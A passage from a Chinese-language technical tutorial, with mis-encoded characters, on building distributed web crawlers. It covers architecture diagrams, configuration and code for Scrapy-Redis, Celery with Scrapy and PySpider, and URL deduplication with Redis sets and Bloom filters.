        ProxyPool[IP ä»£ç†æ± &lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ä»£ç†è½®æ¢&lt;br/&gt;â€¢ å¥åº·æ£€æŸ¥&lt;br/&gt;â€¢ æ•…éšœè½¬ç§»]
    end

    subgraph Storage["æ•°æ®å­˜å‚¨å±‚"]
        MongoDB[(MongoDB&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ çˆ¬å–æ•°æ®&lt;br/&gt;â€¢ çµæ´» Schema&lt;br/&gt;â€¢ åˆ†ç‰‡é›†ç¾¤)]
        MySQL[(MySQL&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ç»“æ„åŒ–æ•°æ®&lt;br/&gt;â€¢ äº‹åŠ¡æ”¯æŒ)]
        ES[(Elasticsearch&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å…¨æ–‡æœç´¢&lt;br/&gt;â€¢ å®æ—¶åˆ†æ)]
        Cache[(Redis Cache&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ çƒ­æ•°æ®ç¼“å­˜&lt;br/&gt;â€¢ ä¼šè¯å­˜å‚¨)]
    end

    Monitor -.ç›‘æ§.-&gt; Redis
    Monitor -.ç›‘æ§.-&gt; Workers
    Monitor -.ç›‘æ§.-&gt; Storage
    Config -.é…ç½®.-&gt; Workers

    Redis &lt;--&gt;|è·å–ä»»åŠ¡&lt;br/&gt;ä¸ŠæŠ¥çŠ¶æ€| W1
    Redis &lt;--&gt;|è·å–ä»»åŠ¡&lt;br/&gt;ä¸ŠæŠ¥çŠ¶æ€| W2
    Redis &lt;--&gt;|è·å–ä»»åŠ¡&lt;br/&gt;ä¸ŠæŠ¥çŠ¶æ€| W3
    Redis &lt;--&gt;|è·å–ä»»åŠ¡&lt;br/&gt;ä¸ŠæŠ¥çŠ¶æ€| WN

    MQ --&gt;|ä»»åŠ¡åˆ†å‘| Workers

    W1 --&gt;|ä½¿ç”¨ä»£ç†| ProxyPool
    W2 --&gt;|ä½¿ç”¨ä»£ç†| ProxyPool
    W3 --&gt;|ä½¿ç”¨ä»£ç†| ProxyPool
    WN --&gt;|ä½¿ç”¨ä»£ç†| ProxyPool

    W1 --&gt;|å­˜å‚¨æ•°æ®| MongoDB
    W2 --&gt;|å­˜å‚¨æ•°æ®| MongoDB
    W3 --&gt;|å­˜å‚¨æ•°æ®| MySQL
    WN --&gt;|å­˜å‚¨æ•°æ®| ES

    Workers --&gt;|ç¼“å­˜| Cache

    style Monitor fill:#4a90e2
    style Redis fill:#e74c3c
    style MQ fill:#f39c12
    style Workers fill:#27ae60
    style ProxyPool fill:#9b59b6
    style Storage fill:#3498db
</code></pre>

      <h4 id="scrapy-redis-åˆ†å¸ƒå¼æ¶æ„è¯¦è§£">Scrapy-Redis åˆ†å¸ƒå¼æ¶æ„è¯¦è§£</h4>

      <pre><code>sequenceDiagram
    participant M as Master æ§åˆ¶å°
    participant R as Redis&lt;br/&gt;(ä»»åŠ¡é˜Ÿåˆ—+å»é‡)
    participant S1 as Spider èŠ‚ç‚¹ 1
    participant S2 as Spider èŠ‚ç‚¹ 2
    participant S3 as Spider èŠ‚ç‚¹ N
    participant DB as MongoDB

    Note over M,DB: é˜¶æ®µ 1: åˆå§‹åŒ–

    M-&gt;&gt;R: LPUSH start_urls&lt;br/&gt;æ·»åŠ ç§å­ URL
    R--&gt;&gt;M: é˜Ÿåˆ—åˆå§‹åŒ–å®Œæˆ

    S1-&gt;&gt;R: å¯åŠ¨çˆ¬è™«&lt;br/&gt;è¿æ¥ Redis
    S2-&gt;&gt;R: å¯åŠ¨çˆ¬è™«&lt;br/&gt;è¿æ¥ Redis
    S3-&gt;&gt;R: å¯åŠ¨çˆ¬è™«&lt;br/&gt;è¿æ¥ Redis

    Note over M,DB: é˜¶æ®µ 2: ä»»åŠ¡ç«äº‰ä¸åˆ†å‘

    loop æŒç»­çˆ¬å–
        S1-&gt;&gt;R: RPOP requests&lt;br/&gt;è·å–ä»»åŠ¡
        R--&gt;&gt;S1: URL1

        S2-&gt;&gt;R: RPOP requests&lt;br/&gt;è·å–ä»»åŠ¡
        R--&gt;&gt;S2: URL2

        S3-&gt;&gt;R: RPOP requests&lt;br/&gt;è·å–ä»»åŠ¡
        R--&gt;&gt;S3: URL3

        Note over S1,S3: å¹¶è¡Œä¸‹è½½é¡µé¢

        S1-&gt;&gt;S1: ä¸‹è½½å¹¶è§£æ URL1
        S2-&gt;&gt;S2: ä¸‹è½½å¹¶è§£æ URL2
        S3-&gt;&gt;S3: ä¸‹è½½å¹¶è§£æ URL3

        Note over S1,S3: æå–æ–° URL

        S1-&gt;&gt;R: SADD dupefilter&lt;br/&gt;æ£€æŸ¥ URL æ˜¯å¦é‡å¤
        alt URL æœªé‡å¤
            R--&gt;&gt;S1: 1 (æ–° URL)
            S1-&gt;&gt;R: LPUSH requests&lt;br/&gt;æ·»åŠ æ–°ä»»åŠ¡
        else URL å·²å­˜åœ¨
            R--&gt;&gt;S1: 0 (é‡å¤)
            S1-&gt;&gt;S1: ä¸¢å¼ƒé‡å¤ URL
        end

        S2-&gt;&gt;R: SADD dupefilter&lt;br/&gt;æ£€æŸ¥å»é‡
        R--&gt;&gt;S2: URL çŠ¶æ€
        S2-&gt;&gt;R: LPUSH requests&lt;br/&gt;æ·»åŠ æ–°ä»»åŠ¡

        S3-&gt;&gt;R: SADD dupefilter&lt;br/&gt;æ£€æŸ¥å»é‡
        R--&gt;&gt;S3: URL çŠ¶æ€
        S3-&gt;&gt;R: LPUSH requests&lt;br/&gt;æ·»åŠ æ–°ä»»åŠ¡

        Note over S1,S3: å­˜å‚¨æ•°æ®

        S1-&gt;&gt;DB: å­˜å‚¨ Item
        S2-&gt;&gt;DB: å­˜å‚¨ Item
        S3-&gt;&gt;DB: å­˜å‚¨ Item
    end

    Note over M,DB: é˜¶æ®µ 3: å®Œæˆä¸æ¸…ç†

    S1-&gt;&gt;R: LLEN requests&lt;br/&gt;æ£€æŸ¥é˜Ÿåˆ—
    R--&gt;&gt;S1: 0 (é˜Ÿåˆ—ä¸ºç©º)
    Note over S1: ç­‰å¾…æ–°ä»»åŠ¡æˆ–é€€å‡º
</code></pre>

      <h4 id="url-å»é‡ç­–ç•¥å¯¹æ¯”">URL å»é‡ç­–ç•¥å¯¹æ¯”</h4>

      <pre><code>graph TB
    Start[æ–° URL åˆ°è¾¾] --&gt; Choice{é€‰æ‹©å»é‡ç­–ç•¥}

    Choice --&gt;|å°è§„æ¨¡&lt;br/&gt;&lt; 1000ä¸‡| RedisSet[Redis Set&lt;br/&gt;â”â”â”â”â”â”â”â”]
    Choice --&gt;|å¤§è§„æ¨¡&lt;br/&gt;&gt; 1äº¿| BloomFilter[Bloom Filter&lt;br/&gt;â”â”â”â”â”â”â”â”]
    Choice --&gt;|è¶…å¤§è§„æ¨¡&lt;br/&gt;&gt; 10äº¿| Hybrid[æ··åˆç­–ç•¥&lt;br/&gt;â”â”â”â”â”â”â”â”]

    RedisSet --&gt; RS1[è®¡ç®— URL Hash&lt;br/&gt;MD5/SHA256]
    RS1 --&gt; RS2{SADD url_hash}
    RS2 --&gt;|è¿”å› 1| RS3[âœ… æ–° URL&lt;br/&gt;æ·»åŠ åˆ°é˜Ÿåˆ—]
    RS2 --&gt;|è¿”å› 0| RS4[âŒ é‡å¤ URL&lt;br/&gt;ä¸¢å¼ƒ]

    BloomFilter --&gt; BF1[è®¡ç®—å¤šä¸ª Hash&lt;br/&gt;6-7 ä¸ªå“ˆå¸Œå‡½æ•°]
    BF1 --&gt; BF2{æ£€æŸ¥æ‰€æœ‰ä½}
    BF2 --&gt;|ä»»ä¸€ä½ä¸º 0| BF3[âœ… å¯èƒ½æ–° URL&lt;br/&gt;è®¾ç½®æ‰€æœ‰ä½ä¸º 1]
    BF2 --&gt;|æ‰€æœ‰ä½ä¸º 1| BF4[âŒ å¯èƒ½é‡å¤&lt;br/&gt;ä¸¢å¼ƒ]

    BF3 --&gt; BF5[âš ï¸ å­˜åœ¨è¯¯åˆ¤&lt;br/&gt;è¯¯åˆ¤ç‡ 0.01%-0.1%]
    BF4 --&gt; BF6[âš ï¸ å¯èƒ½è¯¯åˆ¤&lt;br/&gt;æ–° URL è¢«å½“ä½œæ—§ URL]

    Hybrid --&gt; H1[ä¸¤çº§è¿‡æ»¤]
    H1 --&gt; H2[ç¬¬ä¸€çº§:&lt;br/&gt;Bloom Filter&lt;br/&gt;å¿«é€Ÿè¿‡æ»¤æ˜æ˜¾é‡å¤]
    H2 --&gt; H3{Bloom åˆ¤æ–­}
    H3 --&gt;|å¯èƒ½æ–°| H4[ç¬¬äºŒçº§:&lt;br/&gt;Redis Set&lt;br/&gt;ç²¾ç¡®éªŒè¯]
    H3 --&gt;|é‡å¤| H5[âŒ ä¸¢å¼ƒ]

    H4 --&gt; H6{Redis ç²¾ç¡®æ£€æŸ¥}
    H6 --&gt;|æ–° URL| H7[âœ… æ·»åŠ åˆ°é˜Ÿåˆ—]
    H6 --&gt;|é‡å¤| H5

    subgraph Comparison["æ€§èƒ½å¯¹æ¯”"]
        T1[Redis Set&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;å†…å­˜: 8GB / 1äº¿&lt;br/&gt;é€Ÿåº¦: O1&lt;br/&gt;å‡†ç¡®: 100%]
        T2[Bloom Filter&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;å†…å­˜: 128MB / 1äº¿&lt;br/&gt;é€Ÿåº¦: O1&lt;br/&gt;å‡†ç¡®: 99.9%]
        T3[æ··åˆç­–ç•¥&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;å†…å­˜: ä¸­ç­‰&lt;br/&gt;é€Ÿåº¦: å¿«&lt;br/&gt;å‡†ç¡®: 99.99%]
    end

    style RS3 fill:#51cf66
    style RS4 fill:#ff6b6b
    style BF3 fill:#51cf66
    style BF4 fill:#ffd43b
    style BF5 fill:#ffd43b
    style BF6 fill:#ffd43b
    style H7 fill:#51cf66
    style H5 fill:#ff6b6b
</code></pre>

      <hr />

      <h2 id="è¯¦ç»†å†…å®¹">è¯¦ç»†å†…å®¹</h2>

      <h3 id="ä¸»æµåˆ†å¸ƒå¼çˆ¬è™«æ¡†æ¶">ä¸»æµåˆ†å¸ƒå¼çˆ¬è™«æ¡†æ¶</h3>

      <h4 id="1-scrapy-redis">1. Scrapy-Redis</h4>

      <p><strong>Scrapy-Redis</strong> æ˜¯åŸºäº Scrapy çš„åˆ†å¸ƒå¼æ‰©å±•ï¼Œä½¿ç”¨ Redis ä½œä¸ºä»»åŠ¡é˜Ÿåˆ—å’Œå»é‡æ•°æ®åº“ã€‚</p>

      <p><strong>æ ¸å¿ƒç‰¹æ€§ï¼š</strong></p>

      <ul>
        <li><strong>å…±äº«è°ƒåº¦å™¨</strong>ï¼šä½¿ç”¨ Redis List ä½œä¸ºè¯·æ±‚é˜Ÿåˆ—</li>
        <li><strong>åˆ†å¸ƒå¼å»é‡</strong>ï¼šä½¿ç”¨ Redis Set å®ç° URL å»é‡</li>
        <li><strong>æŒä¹…åŒ–</strong>ï¼šä»»åŠ¡é˜Ÿåˆ—æŒä¹…åŒ–åˆ° Redisï¼Œæ”¯æŒæ–­ç‚¹ç»­çˆ¬</li>
        <li><strong>åŠ¨æ€æ·»åŠ çˆ¬è™«</strong>ï¼šå¯ä»¥éšæ—¶å¯åŠ¨æˆ–åœæ­¢çˆ¬è™«èŠ‚ç‚¹</li>
      </ul>

      <p><strong>åŸºæœ¬é…ç½®ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># settings.py</span>
<span class="c1"># å¯ç”¨ Scrapy-Redis è°ƒåº¦å™¨</span>
<span class="n">SCHEDULER</span> <span class="o">=</span> <span class="s2">&quot;scrapy_redis.scheduler.Scheduler&quot;</span>

<span class="c1"># å¯ç”¨å»é‡è¿‡æ»¤å™¨</span>
<span class="n">DUPEFILTER_CLASS</span> <span class="o">=</span> <span class="s2">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span>

<span class="c1"># å¯ç”¨ Scrapy-Redis Pipeline</span>
<span class="n">ITEM_PIPELINES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;scrapy_redis.pipelines.RedisPipeline&#39;</span><span class="p">:</span> <span class="mi">300</span>
<span class="p">}</span>

<span class="c1"># Redis è¿æ¥é…ç½®</span>
<span class="n">REDIS_HOST</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
<span class="n">REDIS_PORT</span> <span class="o">=</span> <span class="mi">6379</span>

<span class="c1"># é˜Ÿåˆ—æŒä¹…åŒ–</span>
<span class="n">SCHEDULER_PERSIST</span> <span class="o">=</span> <span class="kc">True</span>

<span class="c1"># è¯·æ±‚é˜Ÿåˆ—çš„é”®</span>
<span class="n">SCHEDULER_QUEUE_KEY</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%(spider)s</span><span class="s1">:requests&#39;</span>

<span class="c1"># å»é‡é›†åˆçš„é”®</span>
<span class="n">SCHEDULER_DUPEFILTER_KEY</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%(spider)s</span><span class="s1">:dupefilter&#39;</span>
</code></pre>
      </div>

      <p><strong>çˆ¬è™«å®ç°ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># spider.py</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy_redis.spiders</span><span class="w"> </span><span class="kn">import</span> <span class="n">RedisSpider</span>

<span class="k">class</span><span class="w"> </span><span class="nc">MySpider</span><span class="p">(</span><span class="n">RedisSpider</span><span class="p">):</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;myspider&#39;</span>
    <span class="n">redis_key</span> <span class="o">=</span> <span class="s1">&#39;myspider:start_urls&#39;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
        <span class="c1"># è§£æé€»è¾‘</span>
        <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">extract_items</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
            <span class="k">yield</span> <span class="n">item</span>

        <span class="c1"># æå–æ–°çš„ URL</span>
        <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;a::attr(href)&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">getall</span><span class="p">():</span>
            <span class="k">yield</span> <span class="n">response</span><span class="o">.</span><span class="n">follow</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>å¯åŠ¨æ–¹å¼ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åœ¨å¤šå°æœºå™¨ä¸Šå¯åŠ¨çˆ¬è™«</span>
scrapy<span class="w"> </span>crawl<span class="w"> </span>myspider

<span class="c1"># å‘ Redis æ·»åŠ èµ·å§‹ URL</span>
redis-cli<span class="w"> </span>lpush<span class="w"> </span>myspider:start_urls<span class="w"> </span><span class="s2">&quot;http://example.com&quot;</span>
</code></pre>
      </div>

      <h4 id="2-celery-scrapy">2. Celery + Scrapy</h4>

      <p><strong>Celery</strong> æ˜¯ Python åˆ†å¸ƒå¼ä»»åŠ¡é˜Ÿåˆ—æ¡†æ¶ï¼Œå¯ä»¥ä¸ Scrapy ç»“åˆå®ç°æ›´çµæ´»çš„ä»»åŠ¡è°ƒåº¦ã€‚</p>

      <p><strong>æ¶æ„ç‰¹ç‚¹ï¼š</strong></p>

      <ul>
        <li><strong>å¼‚æ­¥ä»»åŠ¡</strong>ï¼šçˆ¬å–ä»»åŠ¡ä»¥å¼‚æ­¥æ–¹å¼æ‰§è¡Œ</li>
        <li><strong>ä»»åŠ¡é‡è¯•</strong>ï¼šæ”¯æŒå¤±è´¥ä»»åŠ¡è‡ªåŠ¨é‡è¯•</li>
        <li><strong>å®šæ—¶ä»»åŠ¡</strong>ï¼šæ”¯æŒå®šæ—¶è§¦å‘çˆ¬å–ä»»åŠ¡</li>
        <li><strong>ç›‘æ§ç®¡ç†</strong>ï¼šä½¿ç”¨ Flower ç›‘æ§ä»»åŠ¡çŠ¶æ€</li>
      </ul>

      <p><strong>é…ç½®ç¤ºä¾‹ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># celery_app.py</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">celery</span><span class="w"> </span><span class="kn">import</span> <span class="n">Celery</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Celery</span><span class="p">(</span><span class="s1">&#39;crawler&#39;</span><span class="p">,</span>
             <span class="n">broker</span><span class="o">=</span><span class="s1">&#39;redis://localhost:6379/0&#39;</span><span class="p">,</span>
             <span class="n">backend</span><span class="o">=</span><span class="s1">&#39;redis://localhost:6379/0&#39;</span><span class="p">)</span>

<span class="n">app</span><span class="o">.</span><span class="n">conf</span><span class="o">.</span><span class="n">update</span><span class="p">(</span>
    <span class="n">task_serializer</span><span class="o">=</span><span class="s1">&#39;json&#39;</span><span class="p">,</span>
    <span class="n">result_serializer</span><span class="o">=</span><span class="s1">&#39;json&#39;</span><span class="p">,</span>
    <span class="n">accept_content</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;json&#39;</span><span class="p">],</span>
    <span class="n">timezone</span><span class="o">=</span><span class="s1">&#39;Asia/Shanghai&#39;</span><span class="p">,</span>
    <span class="n">enable_utc</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
<span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">task</span><span class="p">(</span><span class="n">bind</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">max_retries</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">crawl_task</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;çˆ¬å–ä»»åŠ¡&quot;&quot;&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">process</span> <span class="o">=</span> <span class="n">CrawlerProcess</span><span class="p">(</span><span class="n">get_project_settings</span><span class="p">())</span>
        <span class="n">process</span><span class="o">.</span><span class="n">crawl</span><span class="p">(</span><span class="n">MySpider</span><span class="p">,</span> <span class="n">start_urls</span><span class="o">=</span><span class="p">[</span><span class="n">url</span><span class="p">])</span>
        <span class="n">process</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">exc</span><span class="p">:</span>
        <span class="k">raise</span> <span class="bp">self</span><span class="o">.</span><span class="n">retry</span><span class="p">(</span><span class="n">exc</span><span class="o">=</span><span class="n">exc</span><span class="p">,</span> <span class="n">countdown</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>å¯åŠ¨ Workerï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¯åŠ¨ Celery Worker</span>
celery<span class="w"> </span>-A<span class="w"> </span>celery_app<span class="w"> </span>worker<span class="w"> </span>--loglevel<span class="o">=</span>info

<span class="c1"># ä½¿ç”¨ Flower ç›‘æ§</span>
celery<span class="w"> </span>-A<span class="w"> </span>celery_app<span class="w"> </span>flower
</code></pre>
      </div>

      <h4 id="3-pyspider">3. PySpider</h4>

      <p><strong>PySpider</strong> æ˜¯ä¸€ä¸ªè‡ªå¸¦ WebUI çš„åˆ†å¸ƒå¼çˆ¬è™«æ¡†æ¶ã€‚</p>

      <p><strong>ä¸»è¦ç‰¹æ€§ï¼š</strong></p>

      <ul>
        <li><strong>å¯è§†åŒ–ç•Œé¢</strong>ï¼šWeb UI ç®¡ç†çˆ¬è™«å’ŒæŸ¥çœ‹ç»“æœ</li>
        <li><strong>è„šæœ¬ç¼–è¾‘å™¨</strong>ï¼šåœ¨çº¿ç¼–è¾‘å’Œè°ƒè¯•çˆ¬è™«è„šæœ¬</li>
        <li><strong>ä»»åŠ¡ç›‘æ§</strong>ï¼šå®æ—¶æŸ¥çœ‹çˆ¬å–è¿›åº¦å’ŒçŠ¶æ€</li>
        <li><strong>å†…ç½®è°ƒåº¦å™¨</strong>ï¼šæ”¯æŒä¼˜å…ˆçº§è°ƒåº¦å’Œå‘¨æœŸä»»åŠ¡</li>
      </ul>

      <p><strong>ç®€å•ç¤ºä¾‹ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pyspider.libs.base_handler</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="k">class</span><span class="w"> </span><span class="nc">Handler</span><span class="p">(</span><span class="n">BaseHandler</span><span class="p">):</span>
    <span class="n">crawl_config</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;itag&#39;</span><span class="p">:</span> <span class="s1">&#39;v1&#39;</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="nd">@every</span><span class="p">(</span><span class="n">minutes</span><span class="o">=</span><span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">on_start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">crawl</span><span class="p">(</span><span class="s1">&#39;http://example.com&#39;</span><span class="p">,</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">index_page</span><span class="p">)</span>

    <span class="nd">@config</span><span class="p">(</span><span class="n">age</span><span class="o">=</span><span class="mi">10</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">index_page</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">doc</span><span class="p">(</span><span class="s1">&#39;a[href^=&quot;http&quot;]&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">crawl</span><span class="p">(</span><span class="n">each</span><span class="o">.</span><span class="n">attr</span><span class="o">.</span><span class="n">href</span><span class="p">,</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">detail_page</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">detail_page</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">{</span>
            <span class="s2">&quot;url&quot;</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">url</span><span class="p">,</span>
            <span class="s2">&quot;title&quot;</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">doc</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">(),</span>
        <span class="p">}</span>
</code></pre>
      </div>

      <h3 id="url-å»é‡ç­–ç•¥">URL å»é‡ç­–ç•¥</h3>

      <h4 id="1-åŸºäº-redis-set">1. åŸºäº Redis Set</h4>

      <p><strong>åŸç†</strong>ï¼šä½¿ç”¨ Redis çš„ Set æ•°æ®ç»“æ„å­˜å‚¨å·²çˆ¬å–çš„ URL çš„å“ˆå¸Œå€¼ã€‚</p>

      <p><strong>ä¼˜ç‚¹</strong>ï¼š</p>

      <ul>
        <li>å®ç°ç®€å•</li>
        <li>æŸ¥è¯¢é€Ÿåº¦å¿«ï¼ˆO(1)ï¼‰</li>
        <li>æ”¯æŒåˆ†å¸ƒå¼</li>
      </ul>

      <p><strong>ç¼ºç‚¹</strong>ï¼š</p>

      <ul>
        <li>å†…å­˜å ç”¨å¤§ï¼ˆ1 äº¿ URL çº¦éœ€ 4-8 GBï¼‰</li>
      </ul>

      <p><strong>å®ç°ç¤ºä¾‹ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RedisDeduplicator</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">6379</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;crawler:urls&#39;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">url_hash</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®¡ç®— URL å“ˆå¸Œ&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">is_duplicate</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ£€æŸ¥ URL æ˜¯å¦é‡å¤&quot;&quot;&quot;</span>
        <span class="n">url_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url_hash</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">sismember</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">url_hash</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">add_url</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ·»åŠ  URL åˆ°å»é‡é›†åˆ&quot;&quot;&quot;</span>
        <span class="n">url_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url_hash</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">sadd</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">url_hash</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">check_and_add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ£€æŸ¥å¹¶æ·»åŠ ï¼ˆåŸå­æ“ä½œï¼‰&quot;&quot;&quot;</span>
        <span class="n">url_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url_hash</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="c1"># è¿”å› 1 è¡¨ç¤ºæ–° URLï¼Œ0 è¡¨ç¤ºé‡å¤</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">sadd</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">url_hash</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>
</code></pre>
      </div>

      <h4 id="2-åŸºäº-bloom-filterå¸ƒéš†è¿‡æ»¤å™¨">2. åŸºäº Bloom Filterï¼ˆå¸ƒéš†è¿‡æ»¤å™¨ï¼‰</h4>

      <p><strong>åŸç†</strong>ï¼šä½¿ç”¨å¤šä¸ªå“ˆå¸Œå‡½æ•°å°† URL æ˜ å°„åˆ°ä½æ•°ç»„ï¼Œç©ºé—´æ•ˆç‡æé«˜ä½†å­˜åœ¨ä¸€å®šè¯¯åˆ¤ç‡ã€‚</p>

      <p><strong>ä¼˜ç‚¹</strong>ï¼š</p>

      <ul>
        <li>å†…å­˜å ç”¨æå°ï¼ˆ1 äº¿ URL çº¦éœ€ 120 MBï¼Œè¯¯åˆ¤ç‡ 0.1%ï¼‰</li>
        <li>æŸ¥è¯¢é€Ÿåº¦å¿«</li>
        <li>é€‚åˆæµ·é‡æ•°æ®å»é‡</li>
      </ul>

      <p><strong>ç¼ºç‚¹</strong>ï¼š</p>

      <ul>
        <li>å­˜åœ¨è¯¯åˆ¤ï¼ˆå¯èƒ½å°†æœªçˆ¬å–çš„ URL è¯¯åˆ¤ä¸ºå·²çˆ¬å–ï¼‰</li>
        <li>æ— æ³•åˆ é™¤å·²æ·»åŠ çš„å…ƒç´ </li>
      </ul>

      <p><strong>å‚æ•°é…ç½®å»ºè®®ï¼š</strong></p>

      <table>
        <thead>
